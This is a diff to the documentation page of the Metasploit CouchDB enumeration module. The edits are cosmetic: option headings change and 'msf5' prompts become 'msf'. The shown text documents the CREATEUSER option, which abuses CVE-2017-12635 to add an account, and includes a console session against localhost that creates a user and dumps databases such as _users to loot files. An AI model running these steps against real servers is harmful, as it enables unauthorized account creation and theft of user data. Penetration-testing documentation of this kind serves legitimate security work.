@@ -20,11 +20,11 @@ The following was done on Ubuntu 16.04, and is largely base on [1and1.com](https
 
 ## Options
 
-  **SERVERINFO**
+### SERVERINFO
 
   If set to `true`, the server info will also enumerated and set in msf's DB.  Defaults to `false`.
 
-  **CREATEUSER**
+### CREATEUSER
 
   If set to `true`, the server info will attempt to create an account in CouchDB using configured credentials (limited to CVE-2017-12635 conditions). Defaults to `false`.
 
@@ -33,8 +33,8 @@ The following was done on Ubuntu 16.04, and is largely base on [1and1.com](https
 Dumping databases with `SERVERINFO` and `CREATEUSER` set:
 
 ```
-msf5 > use auxiliary/scanner/couchdb/couchdb_enum
-msf5 auxiliary(scanner/couchdb/couchdb_enum) > options
+msf > use auxiliary/scanner/couchdb/couchdb_enum
+msf auxiliary(scanner/couchdb/couchdb_enum) > options
 
 Module options (auxiliary/scanner/couchdb/couchdb_enum):
 
@@ -52,19 +52,19 @@ Module options (auxiliary/scanner/couchdb/couchdb_enum):
    TARGETURI     /_all_dbs        yes       Path to list all the databases
    VHOST                          no        HTTP server virtual host
 
-msf5 auxiliary(scanner/couchdb/couchdb_enum) > set rhosts 127.0.0.1
+msf auxiliary(scanner/couchdb/couchdb_enum) > set rhosts 127.0.0.1
 rhosts => 127.0.0.1
-msf5 auxiliary(scanner/couchdb/couchdb_enum) > set serverinfo true
+msf auxiliary(scanner/couchdb/couchdb_enum) > set serverinfo true
 serverinfo => true
-msf5 auxiliary(scanner/couchdb/couchdb_enum) > set createuser true
+msf auxiliary(scanner/couchdb/couchdb_enum) > set createuser true
 createuser => true
-msf5 auxiliary(scanner/couchdb/couchdb_enum) > set verbose true
+msf auxiliary(scanner/couchdb/couchdb_enum) > set verbose true
 verbose => true
-msf5 auxiliary(scanner/couchdb/couchdb_enum) > check
+msf auxiliary(scanner/couchdb/couchdb_enum) > check
 
 [+] 127.0.0.1:5984 - Found CouchDB version 2.1.0
 [*] 127.0.0.1:5984 - The target appears to be vulnerable.
-msf5 auxiliary(scanner/couchdb/couchdb_enum) > run
+msf auxiliary(scanner/couchdb/couchdb_enum) > run
 
 [+] 127.0.0.1:5984 - Found CouchDB version 2.1.0
 [+] 127.0.0.1:5984 - User CQuXQnVwQAow created with password IJvoGDWAWzQo. Connect to http://127.0.0.1:5984/_utils/ to login.
@@ -92,5 +92,5 @@ msf5 auxiliary(scanner/couchdb/couchdb_enum) > run
 [+] 127.0.0.1:5984 - _replicator saved in: /Users/wvu/.msf4/loot/20190107125002_default_127.0.0.1_couchdb._replica_022445.bin
 [+] 127.0.0.1:5984 - _users saved in: /Users/wvu/.msf4/loot/20190107125002_default_127.0.0.1_couchdb._users_671128.bin
 [*] Auxiliary module execution completed
-msf5 auxiliary(scanner/couchdb/couchdb_enum) >
+msf auxiliary(scanner/couchdb/couchdb_enum) >
 ```
